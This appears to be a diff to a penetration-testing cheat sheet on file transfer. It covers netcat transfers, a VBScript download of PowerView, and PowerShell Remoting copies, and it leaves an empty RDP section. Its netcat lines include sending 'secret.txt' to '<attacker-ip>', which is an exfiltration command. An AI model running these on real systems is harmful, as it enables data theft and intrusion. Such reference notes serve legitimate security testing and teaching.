@@ -344,13 +344,12 @@ end with
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
-# Netcat
 
-# Netcat / Ncat File Transfer
+# Netcat / Ncat
 
 ## 1. Victim Listens → Attacker Sends
-> Use when inbound connections to the victim are allowed.
 
+> Use when inbound connections to the victim are allowed.
 ### Victim (Original Netcat)
 ```bash
 nc -l -p 8000 > file
@@ -426,3 +425,65 @@ nc -l -p 443 > secret.txt
 ```bash
 nc <attacker-ip> 443 < secret.txt
 ```
+
+# PowerShell Remoting
+
+> Requires WinRM access and sufficient permissions.  
+> Default ports: **5985 (HTTP)** / **5986 (HTTPS)**
+
+## Check WinRM Connectivity
+
+```powershell
+# Confirm the remote WinRM port is reachable
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+```
+
+## Create a Remote Session
+
+```powershell
+# Uses the current user's credentials
+$Session = New-PSSession -ComputerName DATABASE01
+```
+
+```powershell
+# Use explicit credentials when required
+$Cred = Get-Credential
+$Session = New-PSSession -ComputerName DATABASE01 -Credential $Cred
+```
+
+## Upload: Local → Remote
+
+```powershell
+# Copy a local file to the remote PowerShell session
+Copy-Item `
+  -Path C:\samplefile.txt `
+  -Destination C:\Users\Administrator\Desktop\ `
+  -ToSession $Session
+```
+
+## Download: Remote → Local
+
+```powershell
+# Copy a remote file to the local machine
+Copy-Item `
+  -Path C:\Users\Administrator\Desktop\DATABASE.txt `
+  -Destination C:\ `
+  -FromSession $Session
+```
+
+## Close the Session
+
+```powershell
+# Remove the PowerShell Remoting session
+Remove-PSSession $Session
+```
+
+# RDP
+
+## Mounting a Linux Folder Using rdesktop
+
+```bash
+
+```
+
+## Mounting a Linux Folder Using xfreerdp
